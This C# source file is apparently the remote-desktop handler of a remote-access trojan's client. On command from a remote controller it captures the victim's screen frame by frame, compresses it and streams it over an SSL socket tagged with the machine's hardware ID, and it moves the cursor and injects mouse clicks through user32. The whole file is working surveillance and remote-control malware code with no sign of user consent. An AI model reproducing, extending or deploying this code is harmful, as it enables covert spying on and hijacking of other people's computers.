using Client.MessagePack;
using Client.Sockets;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using Client.Helper;
using System;
using Client.StreamLibrary.UnsafeCodecs;
using Client.StreamLibrary;
using System.Runtime.InteropServices;

namespace Client.Handle_Packet
{
    public class HandleRemoteDesktop
    {

        public HandleRemoteDesktop(MsgPack unpack_msgpack)
        {
            switch (unpack_msgpack.ForcePathObject("Option").AsString)
            {
                case "capture":
                    {
                        CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
                        break;
                    }

                case "mouseClick":
                    {
                        Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
                        Cursor.Position = position;
                        mouse_event((Int32)unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
                        break;
                    }

                case "mouseMove":
                    {
                        Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
                        Cursor.Position = position;
                        break;
                    }
            }
        }
        public void CaptureAndSend(int quality, int Scrn)
        {
            TempSocket tempSocket = new TempSocket();
            string hwid = Methods.HWID();
            Bitmap bmp = null;
            BitmapData bmpData = null;
            Rectangle rect;
            Size size;
            MsgPack msgpack;
            IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
            MemoryStream stream;
            while (tempSocket.IsConnected && ClientSocket.IsConnected)
            {
                try
                {
                    bmp = GetScreen(Scrn);
                    rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    size = new Size(bmp.Width, bmp.Height);
                    bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (stream = new MemoryStream())
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height), new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("ID").AsString = hwid;
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(System.Windows.Forms.Screen.AllScreens.Length);
                            tempSocket.SslClient.Write(BitConverter.GetBytes(msgpack.Encode2Bytes().Length));
                            tempSocket.SslClient.Write(msgpack.Encode2Bytes());
                            tempSocket.SslClient.Flush();
                            System.Threading.Thread.Sleep(1);
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
                catch { break; }
            }
            bmp?.UnlockBits(bmpData);
            bmp?.Dispose();
            tempSocket?.Dispose();
        }

        private Bitmap GetScreen(int Scrn)
        {
            Rectangle rect = Screen.AllScreens[Scrn].Bounds;
            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                using (Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot))
                {
                    gfxScreenshot.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                    return bmpScreenshot;
                }
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }

        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
    }
}
